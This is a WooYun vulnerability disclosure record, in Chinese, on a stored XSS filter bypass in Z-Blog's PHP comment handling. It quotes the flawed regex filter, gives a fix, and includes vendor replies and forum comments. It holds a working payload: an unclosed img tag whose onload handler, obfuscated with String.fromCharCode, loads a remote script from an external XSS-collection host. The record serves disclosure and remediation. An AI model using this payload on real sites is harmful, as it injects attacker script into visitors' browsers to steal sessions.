{"id": 7271, "wybug_id": "wooyun-2013-037952", "wybug_title": "Z-Blog的PHP版前台存储型XSS漏洞一", "wybug_corp": "Z-Blog", "wybug_author": "只发通用型", "wybug_date": "2013-09-24 11:30", "wybug_open_date": "2013-12-23 11:31", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向公众公开  简要描述： 看到你们内测的消息我就屁颠屁颠地跑过来了，花了两个通宵看代码发现几处漏洞..这里先绕过了你们XSS过滤脚本.. 详细说明：  问题出在/zb_system/function/c_system_common.php\nfunction TransferHTML($source,$para){\tif(strpos($para, '[nohtml]')!==false){\t\t$source=preg_replace(\"/<([^<>]*)>/si\",\"\",$source);\t}\tif(strpos($para, '[noscript]')!==false){\t\t$source=preg_replace(\"/<(script.*?)>(.*?)<(script.*?)>/si\",\"\",$source);\t\t$source=preg_replace(\"/<(?script.*?)>/si\",\"\",$source); \t\t$source=preg_replace(\"/javascript/si\",\"\",$source);\t\t$source=preg_replace(\"/vbscript/si\",\"\",$source);\t\t$source=preg_replace(\"/on([a-z]+)*=/si\",\"on\\=\",$source);\t}\tif(strpos($para, '[enter]')!==false){\t\t$source=str_replace(\"\",\"<br/>\",$source);\t\t$source=str_replace(\"\",\"<br/>\",$source);\t\t$source=str_replace(\"\",\"<br/>\",$source);\t\t$source=preg_replace(\"/(<br>)+/\", \"<br/>\", $source);\t}\tif(strpos($para, '[noenter]')!==false){\t\t$source=str_replace(\"\",\"\",$source);\t\t$source=str_replace(\"\",\"\",$source);\t\t$source=str_replace(\"\",\"\",$source);\t}\tif(strpos($para, '[filename]')!==false){\t\t$source=str_replace(array(\"/\",\"#\",\"$\",\"\\\",\":\",\"?\",\"*\",\"\",\"<\",\">\",\"|\",\" \"),array(\"\"),$source);\t}\tif(strpos($para, '[normalname]')!==false){\t\t$source=str_replace(array(\"#\",\"$\",\"(\",\")\",\"*\",\"+\",\"[\",\"]\",\"{\",\"}\",\"?\",\"\\\",\"^\",\"|\",\":\",\"'\",\"\",\";\",\"@\",\"~\",\"=\",\"%\",\"&\"),array(\"\"),$source);\t}\treturn $source;}\nXSS过滤函数，看上去是很安全，可是可是 这个正则有个问题，他判断是XSS成立的条件是<>两个存在script,javascript,vbscript.onxxxx…but…开发似乎不知道，img标签是可以不闭合<>,浏览器会帮你闭合的这个特性，更多详情 请看http://drops.wooyun.org/tips/147插入XSS代码\n<img/src=http://www.baidu.com/img/baidu_sylogo1.gif onload=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,105,120,115,115,46,105,110,47,47,122,83,106,109,68,65,63,49,51,55,57,57,57,50,51,55,57);document.body.appendChild(window.s)})()\n不闭合img标签，成功绕过\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  你评论又不需要用到html，直接$comment->Content=htmlspecialchars($comment->Content,'[nohtml]');   版权声明：转载请注明来源 只发通用型@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-09-24 13:52 厂商回复： 暂时先用htmlspecialchars($comment->Content,'[nohtml]');替换一下 最新状态： 2013-09-24：dbsql.php第197行，删除就好了。  ", "replys": "漏洞评价：\n评论\n     2013-09-24 13:46 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  别给20RANK啊  要被小厂商流程的 比5rank高一点就好    \n     2013-09-24 13:59 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @只发通用型  .....刷rank老手，快说，你是谁的马甲！    \n     2013-09-24 14:07 |    \t\tZ-Blog(乌云厂商)\t\t \n  。。。我是ZBLOG的。第一次打分，可以改不？    \n     2013-09-24 14:13 |    \t\tZ-Blog(乌云厂商)\t\t \n  已发信给help#wooyun.org，说明了是第一次打分，不知道规则！！！    \n     2013-09-24 14:30 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  @niliu 别人都叫我疯狗，但是我真名叫剑心,可是很多人都把我认成finger    \n     2013-09-24 14:31 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  @Z-Blog 下次注意就行了 但愿不会有下次？（偷笑    \n     2013-09-24 14:32 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @只发通用型 别人都叫我疯狗，但是我真名叫剑心,可是很多人都把我认成finger，其实猪猪侠才是你的本名！！！    \n     2013-09-24 16:11 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。洞主是来刷钱的    \n     2013-09-24 16:47 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  在内测都不放过 禽兽啊    \n     2013-09-27 15:25 |    \t\t低调 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:18        | .......)\t\t \n  楼主 别带着一个羊薅羊毛呀！！！！！发个DZ的    \n     2013-09-28 02:22 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @niliu 别人都叫我疯狗，但是我真名叫剑心,可是很多人都把我认成finger，其实猪猪侠才是你的表哥本名！！！ 你其实是二哥。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}